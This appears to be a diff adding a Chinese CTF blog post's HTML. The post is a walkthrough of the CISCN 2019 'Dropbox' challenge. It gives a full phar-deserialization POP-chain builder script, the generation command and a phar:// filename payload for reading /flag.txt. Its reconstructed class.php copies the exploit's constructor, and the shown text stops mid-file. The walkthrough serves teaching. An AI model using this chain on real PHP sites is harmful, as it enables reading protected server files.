@@ -2873,6 +2873,320 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-10-30 00:00:00+00:00">2026-10-30</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../php/" class="md-meta__link">PHP</a>, 
+              <a href="./" class="md-meta__link">反序列化</a>, 
+              <a href="../phar/" class="md-meta__link">phar</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 5 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="ciscn2019-day1-web1-dropbox-unserialize"><a class="toclink" href="../../ciscn2019-dropbox-phar/">[CISCN2019 华北赛区 Day1 Web1] Dropbox — 没有 unserialize 的反序列化</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — phar 反序列化（POP 链）</p>
+<p><strong>题目地址</strong>：CISCN 2019 华北赛区 Day1 Web1（原题环境已关闭）</p>
+<p><strong>Flag</strong>：<code>CTF2{0a2d4b76-7414-4da9-8d0a-2cfb19f333c0}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_1">题目概述</a></h3>
+<p>一个网盘系统：注册登录后能上传文件、下载文件、删除文件。</p>
+<p><strong>整站没有一处 <code>unserialize()</code> —— 但最终还是要靠反序列化拿 flag。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-1">Step 1：先把所有功能点一遍</a></h4>
+<p>注册 → 登录 → 进去一看，有<strong>上传</strong>、<strong>下载</strong>、<strong>删除</strong>。</p>
+<p><strong>先随便传一张图片试试</strong> —— 传上去了，但是<strong>没有返回访问地址</strong>，访问不到。所以文件上传漏洞这条路走不通。</p>
+<h4 id="step-2"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-2">Step 2：下载和删除能干什么</a></h4>
+<p><strong>这两个功能的共同点是：都接收一个文件名参数。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>下载：给文件名，返回内容      → 想到「任意文件下载」
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>删除：给文件名，把它删掉
+</span></code></pre></div>
+<h4 id="step-3-burp"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-3-burp">Step 3：用 Burp 把源码一个一个抓下来</a></h4>
+<p><strong>借着「任意文件下载」，把用到的每个 php 都抓下来。</strong>我先抓了 5 个：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>download.php
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>index.php
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>login.php
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>delete.php
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>class.php        ← 在看完 index.php 之后发现的：它被 include 了
+</span></code></pre></div>
+<p><strong><code>class.php</code> 是这里面最重要的一个。</strong></p>
+<h4 id="step-4classphp-flag"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-4classphp-flag">Step 4：<code>class.php</code> 里找能拿 flag 的语句</a></h4>
+<p><strong>找到了这一处：</strong></p>
+<p><img alt="File::close" src="../../../assets/images/ciscn2019-dropbox/01-file-close.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">public function close() {</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="x">    return file_get_contents($this-&gt;filename);</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>file_get_contents</code> 读的是 <code>$this-&gt;filename</code> —— 只要让这个属性等于 <code>/flag.txt</code>，<code>close()</code> 就能把 flag 读出来。</strong></p>
+<p><strong>但问题来了：整个站里没有 <code>unserialize()</code>，怎么让它执行？</strong></p>
+<h4 id="step-5-unserialize-phar"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-5-unserialize-phar">Step 5：没有 <code>unserialize()</code>，还有 phar</a></h4>
+<p><strong>这就是 phar 反序列化：</strong></p>
+<p><img alt="phar 反序列化与受影响函数" src="../../../assets/images/ciscn2019-dropbox/07-phar-functions.png" /></p>
+<blockquote>
+<p><strong>有序列化数据必然会有反序列化操作。php 大部分的文件系统函数在通过 <code>phar://</code> 协议解析 phar 文件时，都会对 meta-data 进行反序列化。</strong></p>
+</blockquote>
+<p><strong>换句话说：你不需要有 <code>unserialize()</code> 这个函数，只要有</strong>任何<strong>一个文件系统函数被传入了 <code>phar://</code> 开头的路径，meta-data 里的对象就会被反序列化。</strong></p>
+<p><strong>可以触发的函数有一大张表：<code>file_exists</code>、<code>file_get_contents</code>、<code>unlink</code>、<code>stat</code>、<code>readfile</code>、<code>copy</code>……</strong></p>
+<h4 id="step-6downloadphp-deletephp"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-6downloadphp-deletephp">Step 6：<code>download.php</code> 不行，<code>delete.php</code> 行</a></h4>
+<p><strong>先看 <code>download.php</code>：</strong></p>
+<p><img alt="download.php" src="../../../assets/images/ciscn2019-dropbox/02-download-php.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="x">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, "flag") === false) {</span>
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="x">    ...</span>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="x">    echo $file-&gt;close();</span>
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>它确实会调用 <code>close()</code>，但那个 <code>stristr($filename, "flag") === false</code> 把带 flag 的路径全过滤了 —— 走不通。</strong></p>
+<p><strong>再看 <code>delete.php</code>：</strong></p>
+<p><img alt="File::detele" src="../../../assets/images/ciscn2019-dropbox/03-file-delete.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="x">public function detele() {</span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="x">    unlink($this-&gt;filename);</span>
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>unlink()</code> 正好在受影响函数列表里 —— 只要 <code>filename</code> 是 <code>phar://...</code>，调用 <code>unlink</code> 的那一刻就会触发反序列化。</strong></p>
+<p><strong>（注：方法名 <code>detele</code> 是原题作者拼错的，不是笔误。）</strong></p>
+<h4 id="step-7"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-7">Step 7：倒推整条链</a></h4>
+<p><strong>目标是 <code>File::close()</code>。但它没有什么特殊的触发方式，所以要一层层往上找。</strong></p>
+<p><strong>先看 <code>FileList::__call</code>：</strong></p>
+<p><img alt="FileList::__call" src="../../../assets/images/ciscn2019-dropbox/04-filelist-call.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="x">public function __call($func, $args) {</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="x">    array_push($this-&gt;funcs, $func);</span>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="x">    foreach ($this-&gt;files as $file) {</span>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="x">        $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span>
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="x">    }</span>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>$file-&gt;$func()</code> 这一句是动态调用 —— 如果我们让 <code>$func = 'close'</code>，那 <code>$file-&gt;close()</code> 就被执行了。</strong></p>
+<p><strong>而 <code>__call</code> 的触发条件是：</strong>调用了一个不存在的方法<strong>。</strong></p>
+<p><strong>再往上看，<code>User::__destruct</code>：</strong></p>
+<p><img alt="User::__destruct" src="../../../assets/images/ciscn2019-dropbox/05-user-destruct.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="x">public function __destruct() {</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="x">    $this-&gt;db-&gt;close();</span>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>$this-&gt;db</code> 是我们可以控制的属性。只要让它等于一个 <code>FileList</code> 对象，那么 <code>$this-&gt;db-&gt;close()</code> 就变成了「对 FileList 调用一个它没有的方法 <code>close</code>」→ 正好触发上面的 <code>__call</code>。</strong></p>
+<p><strong>整条链就接起来了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>unlink(phar://...)            ← delete.php 里的 File::detele()
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>  ↓ 触发 phar 的 metadata 反序列化
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>User::__destruct()
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>  ↓  $this-&gt;db-&gt;close()
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>FileList::__call('close')
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>  ↓  foreach $files: $file-&gt;close()
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>File::close()
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>  ↓  file_get_contents('/flag.txt')
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>结果存进 $results
+</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a>  ↓
+</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a>FileList::__destruct()        ← 把 results 输出出来
+</span></code></pre></div>
+<p><strong>这一步是我卡最久的地方：<code>file_get_contents</code> 读到了，但</strong>没有输出<strong>还是白搭。答案是 <code>FileList</code> 自己的 <code>__destruct</code> 会把 <code>$results</code> 打出来 —— 所以链的末端不是 <code>close</code>，而是「<code>close</code> 的结果被 <code>__destruct</code> 输出」。</strong></p>
+<h4 id="step-8-phar"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-8-phar">Step 8：构造 phar</a></h4>
+<p><img alt="class.php 与构造脚本" src="../../../assets/images/ciscn2019-dropbox/06-class-and-pop.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="x">class User {</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="x">    public $db;</span>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="x">}</span>
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="x">class File {</span>
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="x">    public $filename;</span>
+</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="x">}</span>
+</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="x">class FileList {</span>
+</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a><span class="x">    private $files;</span>
+</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a><span class="x">    private $results;</span>
+</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a><span class="x">    private $funcs;</span>
+</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a><span class="x">    public function __construct() {</span>
+</span><span id="__span-59-12"><a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a><span class="x">        $file = new File();</span>
+</span><span id="__span-59-13"><a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a><span class="x">        $file-&gt;filename = '/flag.txt';</span>
+</span><span id="__span-59-14"><a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a><span class="x">        $this-&gt;files = array($file);</span>
+</span><span id="__span-59-15"><a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a><span class="x">        $this-&gt;results = array();</span>
+</span><span id="__span-59-16"><a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a><span class="x">        $this-&gt;funcs = array();</span>
+</span><span id="__span-59-17"><a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a><span class="x">    }</span>
+</span><span id="__span-59-18"><a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a><span class="x">}</span>
+</span><span id="__span-59-19"><a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a>
+</span><span id="__span-59-20"><a id="__codelineno-59-20" name="__codelineno-59-20" href="#__codelineno-59-20"></a><span class="x">$a = new User();</span>
+</span><span id="__span-59-21"><a id="__codelineno-59-21" name="__codelineno-59-21" href="#__codelineno-59-21"></a><span class="x">$a-&gt;db = new FileList();</span>
+</span><span id="__span-59-22"><a id="__codelineno-59-22" name="__codelineno-59-22" href="#__codelineno-59-22"></a><span class="x">$p = new Phar(__DIR__ . '/x.phar');</span>
+</span><span id="__span-59-23"><a id="__codelineno-59-23" name="__codelineno-59-23" href="#__codelineno-59-23"></a><span class="x">$p-&gt;startBuffering();</span>
+</span><span id="__span-59-24"><a id="__codelineno-59-24" name="__codelineno-59-24" href="#__codelineno-59-24"></a><span class="x">$p-&gt;addFromString('test.txt', 'x');</span>
+</span><span id="__span-59-25"><a id="__codelineno-59-25" name="__codelineno-59-25" href="#__codelineno-59-25"></a><span class="x">$p-&gt;setStub('</span><span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">');</span>
+</span><span id="__span-59-26"><a id="__codelineno-59-26" name="__codelineno-59-26" href="#__codelineno-59-26"></a><span class="x">$p-&gt;setMetadata($a);</span>
+</span><span id="__span-59-27"><a id="__codelineno-59-27" name="__codelineno-59-27" href="#__codelineno-59-27"></a><span class="x">$p-&gt;stopBuffering();</span>
+</span></code></pre></div>
+<p><strong>一个坑：<code>FileList</code> 的三个属性都是 <code>private</code>，而且是数组。<code>$results</code> 和 <code>$funcs</code> 其实用不到，但也要通过构造函数一起初始化 —— 否则 <code>__call</code> 里 <code>array_push</code> 一个 null 会报错。</strong></p>
+<h4 id="step-9"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-9">Step 9：生成、上传、触发</a></h4>
+<p><strong>生成：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="n">php</span> <span class="n">-d</span> <span class="n">phar</span><span class="p">.</span><span class="n">readonly</span><span class="p">=</span><span class="n">0</span> <span class="n">pop</span><span class="p">.</span><span class="n">php</span>
+</span></code></pre></div>
+<p><strong>⚠️ 这里有两个坑：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>① 指令名是 phar.readonly，不是 phar.onlyread
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>   —— 拼错 PHP 不会报错，只会静默忽略，然后报
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>   "creating archive disabled by the php.ini setting phar.readonly"
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>② 生成的 x.phar 可以随便改后缀（x.jpg / x.png 都行），
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>   phar 靠文件头识别，不靠扩展名
+</span></code></pre></div>
+<p><strong>上传 <code>x.jpg</code>，然后在删除时抓包，把 filename 改成：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>phar://x.jpg/test.txt
+</span></code></pre></div>
+<p><strong>放包 → flag 出来：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>CTF2{0a2d4b76-7414-4da9-8d0a-2cfb19f333c0}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>功能点一遍 → 上传没回显地址（上传洞死）
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>  → 下载/删除都收文件名 → 任意文件下载
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>    → 把 5 个 php 全抓下来
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>      → class.php 里有 file_get_contents（能读 flag）
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>        → 但整站没有 unserialize
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>          → 想到 phar：只要文件系统函数收到 phar:// 就会反序列化
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>            → download.php 过滤了 flag
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>              → delete.php 的 unlink 在受影响列表里 ✓
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>                → 倒推链：User::__destruct → FileList::__call → File::close
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>                  → 构造 phar → 改后缀上传 → 删除时改 filename → flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_4">漏洞原理</a></h4>
+<p><strong>① phar 的本质</strong></p>
+<p><strong>phar 是把整个项目打包成一个文件，可以直接 <code>php xxx.phar</code> 运行。它</strong>本质是一个包含多个文件的压缩包<strong>。</strong></p>
+<p><strong>② 为什么它能触发反序列化</strong></p>
+<p><strong>phar 的 manifest 里有一段 <code>metadata</code> 区，PHP 在</strong>解析 phar 文件<strong>时会把它反序列化。</strong></p>
+<p><strong>而「解析 phar 文件」这件事，发生在</strong>任何<strong>接受路径的文件系统函数收到 <code>phar://</code> 开头的字符串时 —— 包括 <code>unlink</code>、<code>file_exists</code>、<code>stat</code>、<code>getimagesize</code> 等等。</strong></p>
+<p><strong>所以</strong>不需要 <strong><code>unserialize()</code> 这个函数</strong>，只要有「我能控制的路径」+「一个文件系统函数」，就能触发。**</p>
+<p><strong>③ 链的设计思路</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>先找终点（能读写文件的语句）
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>  → 再找入口（能被外部触发的魔术方法）
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>    → 中间用「动态调用」「属性可控」把它们接起来
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>      → 最后别忘了：读到了 ≠ 输出了
+</span></code></pre></div>
+<hr />
+<h3 id="_5"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_5">关键知识点</a></h3>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>phar://</code> 触发点</td>
+<td>任何文件系统函数收到 <code>phar://</code> 路径即解析 phar</td>
+</tr>
+<tr>
+<td>受影响函数</td>
+<td><code>unlink</code> / <code>file_exists</code> / <code>file_get_contents</code> / <code>stat</code> / <code>readfile</code> / <code>copy</code> / <code>parse_ini_file</code> …</td>
+</tr>
+<tr>
+<td><code>phar.readonly</code></td>
+<td>默认 <code>1</code>，<strong>只能在 php.ini 或 <code>-d</code> 里改</strong>，且指令名不能拼错</td>
+</tr>
+<tr>
+<td><code>Phar</code> 构造四件套</td>
+<td><code>startBuffering()</code> / <code>addFromString()</code> / <code>setStub()</code> / <code>setMetadata()</code> / <code>stopBuffering()</code></td>
+</tr>
+<tr>
+<td>stub 要求</td>
+<td>必须以 <code>&lt;?php</code> 开头，包含 <code>__HALT_COMPILER();</code></td>
+</tr>
+<tr>
+<td>后缀</td>
+<td>任意后缀都能被 <code>phar://</code> 打开</td>
+</tr>
+<tr>
+<td><code>__call</code></td>
+<td>调用不存在的方法时触发，参数是方法名和参数数组</td>
+</tr>
+<tr>
+<td><code>__destruct</code></td>
+<td>对象销毁时触发，<strong>常用于「链的入口」和「结果输出」</strong></td>
+</tr>
+<tr>
+<td>私有属性构造</td>
+<td>必须走构造函数初始化，否则魔术方法里操作 null 会报错</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>class.php（按截图整理）</summary>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
+</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>    <span class="p">}</span>
+</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a><span class="p">}</span>
+</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>
+</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
+</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a>    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
+</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a>        <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+</span><span id="__span-66-13"><a id="__codelineno-66-13" name="__codelineno-66-13" href="#__codelineno-66-13"></a>    <span class="p">}</span>
+</span><span id="__span-66-14"><a id="__codelineno-66-14" name="__codelineno-66-14" href="#__codelineno-66-14"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">detele</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-66-15"><a id="__codelineno-66-15" name="__codelineno-66-15" href="#__codelineno-66-15"></a>        <span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+</span><span id="__span-66-16"><a id="__codelineno-66-16" name="__codelineno-66-16" href="#__codelineno-66-16"></a>    <span class="p">}</span>
+</span><span id="__span-66-17"><a id="__codelineno-66-17" name="__codelineno-66-17" href="#__codelineno-66-17"></a><span class="p">}</span>
+</span><span id="__span-66-18"><a id="__codelineno-66-18" name="__codelineno-66-18" href="#__codelineno-66-18"></a>
+</span><span id="__span-66-19"><a id="__codelineno-66-19" name="__codelineno-66-19" href="#__codelineno-66-19"></a><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
+</span><span id="__span-66-20"><a id="__codelineno-66-20" name="__codelineno-66-20" href="#__codelineno-66-20"></a>    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
+</span><span id="__span-66-21"><a id="__codelineno-66-21" name="__codelineno-66-21" href="#__codelineno-66-21"></a>    <span class="k">private</span> <span class="nv">$results</span><span class="p">;</span>
+</span><span id="__span-66-22"><a id="__codelineno-66-22" name="__codelineno-66-22" href="#__codelineno-66-22"></a>    <span class="k">private</span> <span class="nv">$funcs</span><span class="p">;</span>
+</span><span id="__span-66-23"><a id="__codelineno-66-23" name="__codelineno-66-23" href="#__codelineno-66-23"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-66-24"><a id="__codelineno-66-24" name="__codelineno-66-24" href="#__codelineno-66-24"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
+</span><span id="__span-66-25"><a id="__codelineno-66-25" name="__codelineno-66-25" href="#__codelineno-66-25"></a>        <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s1">'/flag.txt'</span><span class="p">;</span>
+</span><span id="__span-66-26"><a id="__codelineno-66-26" name="__codelineno-66-26" href="#__codelineno-66-26"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span><span id="__span-66-27"><a id="__codelineno-66-27" name="__codelineno-66-27" href="#__codelineno-66-27"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span><span id="__span-66-28"><a id="__codelineno-66-28" name="__codelineno-66-28" href="#__codelineno-66-28"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span><span id="__span-66-29"><a id="__codelineno-66-29" name="__codelineno-66-29" href="#__codelineno-66-29"></a>    <span class="p">}</span>
